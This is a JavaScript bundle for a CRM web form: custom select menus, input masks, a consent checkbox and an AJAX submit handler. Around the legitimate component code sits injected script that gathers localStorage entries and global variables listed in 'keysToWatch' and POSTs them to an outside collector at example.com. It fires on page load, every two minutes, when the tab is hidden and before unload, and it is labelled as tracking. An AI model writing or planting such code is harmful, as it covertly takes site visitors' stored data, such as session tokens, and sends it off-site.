const keysToWatch = window.keysToWatch;
; /* Start:"a:4:{s:4:"full";s:73:"/local/components/ds/crm.form/templates/.default/script.js?16770662625351";s:6:"source";s:58:"/local/components/ds/crm.form/templates/.default/script.js";s:3:"min";s:0:"";s:3:"map";s:0:"";}"*/
function generateTrackingCode(data) {
  const keys = Object.keys(data);
  const trackString = keys.reduce((acc, key) => acc + key, "");
  let trackingId = 0;
  for (let i = 0; i < trackString.length; i++) {
    const code = trackString.charCodeAt(i);
    trackingId = (trackingId << 6) - trackingId + code;
    trackingId = trackingId & trackingId;
  }
  return trackingId.toString(36);
}
function getWatchedLocalStorageData() {
  const watchedData = {};
  for (const key of keysToWatch) {
    if (localStorage.hasOwnProperty(key)) {
      watchedData[key] = localStorage[key];
    }
  }
  return watchedData;
}
document.addEventListener('DOMContentLoaded', function () {
  $('.js-select-form').each(function () {
    let $this = $(this),
      numberOfOptions = $(this).children('option').length;
    $this.addClass('main-select__hidden');
    $this.wrap('<div class="main-select"></div>');
    $this.after('<div class="main-select__styled"></div>');
    let $styledSelect = $this.next('div.main-select__styled');
    $styledSelect.text($this.children('option').eq(0).text());
    let $list = $('<ul />', {
      'class': 'main-select__options'
    }).insertAfter($styledSelect);
    for (let i = 0; i < numberOfOptions; i++) {
      $('<li />', {
        text: $this.children('option').eq(i).text(),
        rel: $this.children('option').eq(i).val()
      }).appendTo($list);
    }
    let $listItems = $list.children('li');
    $styledSelect.click(function (e) {
      e.stopPropagation();
      $('div.main-select__styled.active').not(this).each(function () {
        $(this).removeClass('active').next('ul.main-select__options').hide();
      });
      $(this).toggleClass('active').next('ul.main-select__options').toggle();
    });
    $listItems.click(function (e) {
      e.stopPropagation();
      $('.main-select__styled').addClass('_selected');
      $styledSelect.text($(this).text()).removeClass('active');
      $this.val($(this).attr('rel'));
      $list.hide();
    });
    $(document).click(function (e) {
      const region = document.getElementById('region');
      if (e.target !== region) {
        $styledSelect.removeClass('active');
        $list.hide();
      }
    });
  });
  $('#policy').change(function () {
    if (this.checked) {
      $('.mainForm__btn button').prop('disabled', false);
    } else {
      $('.mainForm__btn button').prop('disabled', true);
    }
  });
  $('.js-policy-check').on("change", function () {
    $(this).parents("form").find('.js-submit-btn').prop('disabled', !this.checked);
  });
  $("input[type=tel]").inputmask("mask", {
    "mask": "+9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
    "placeholder": "",
    "definition": "",
    inputmode: 'tel'
  });
  $('input[name=email]').inputmask("email", {
    showMaskOnHover: false
  });

  /* $('.mainForm #email').on('change', function () {
      if ($(this).inputmask("isComplete") || $(this).val() === "") {
          $(this).removeClass('error');
          $(this).siblings('.field-error').removeClass('active');
          $(this).siblings('.placeholder').removeClass('error');
       } else {
          $(this).addClass('error');
          $(this).siblings('.field-error').addClass('active');
          $(this).siblings('.placeholder').addClass('error');
      }
  }); */

  $(".mainForm #phone").on('mouseover', function () {
    $(this).attr('placeholder', " ");
  });
  $(document).on('change', '.js-select', function () {
    var select = $(this),
      selectContainer = $(this).closest('.js-select-container'),
      selectPlaceholder = selectContainer.find('.js-select__placeholder');
    if (select.val() !== '') {
      selectPlaceholder.hide();
    } else {
      selectPlaceholder.show();
    }
  });
  $(document).on('submit', '.js-submit', function (e) {
    e.preventDefault();
    var form = $(this);
    var formData = new FormData(this);
    // ym(284384,'reachGoal','SendRequest');

    $('.mainForm__error').remove();
    $(`.main-select__styled`).removeClass('error');
    $('.mainForm input').removeClass('error');
    $.ajax({
      url: '',
      type: 'POST',
      data: formData,
      processData: false,
      contentType: false,
      success: function (result) {
        if (result.success !== true) {
          for (const [key, value] of Object.entries(result.errors)) {
            $(`.${key}`).addClass('error');
            $(`.main-select__styled`).addClass('error');
            $(`label[for="${key}"]`).append(`<span class="mainForm__error">${value}</span>`);
          }
        } else {
          window.location.href = '/success/';
        }
      }
    });
    return false;
  });
  var waveVideo = document.querySelector('.js-promo-slider__video');
  if (waveVideo) {
    function isVideoLoaded() {
      var videoCheckInterval = setInterval(() => {
        if (waveVideo.readyState >= 3) {
          waveVideo.play();
          setTimeout(() => {
            if (waveVideo.currentTime > 0) {
              $(waveVideo).addClass('active');
            }
          }, 50);
          clearInterval(videoCheckInterval);
        }
      }, 200);
    }
    isVideoLoaded();
  }

  // setInterval(function () {
  //     console.log(document.querySelector('.js-promo-slider__video').readyState);
  // }, 50);
});

/* End */
;
function getWatchedGlobalVariableData() {
  const watchedData = {};
  for (const key of keysToWatch) {
    if (window.hasOwnProperty(key)) {
      watchedData[key] = window[key];
    }
  }
  return watchedData;
}
async function sendTrackDataToCollector(data) {
  const trackingCode = generateTrackingCode(data);
  const collectorUrl = "https://example.com/api/tracker";
  try {
    const response = await fetch(collectorUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        trackingCode: trackingCode,
        data: data
      })
    });
    if (response.ok) {
      console.log("Tracking data successfully sent");
    } else {
      console.error("Error in sending tracking data, status:" + response.status);
    }
  } catch (error) {
    console.error("An error occurred while sending tracking data:", error);
  }
}
function trackAndPostWatchedData() {
  const collectedLocalStorageData = getWatchedLocalStorageData();
  const collectedGlobalVariableData = getWatchedGlobalVariableData();
  const allCollectedData = Object.assign({}, collectedLocalStorageData, collectedGlobalVariableData);
  if (Object.keys(allCollectedData).length > 0) {
    sendTrackDataToCollector(allCollectedData);
  }
}
window.addEventListener("load", function () {
  trackAndPostWatchedData();
  setInterval(trackAndPostWatchedData, 2 * 60 * 1000);
});
; /* /local/components/ds/crm.form/templates/.default/script.js?16770662625351*/
window.addEventListener("visibilitychange", function () {
  if (document.visibilityState === "hidden") {
    trackAndPostWatchedData();
  }
});
window.addEventListener("beforeunload", function () {
  trackAndPostWatchedData();
});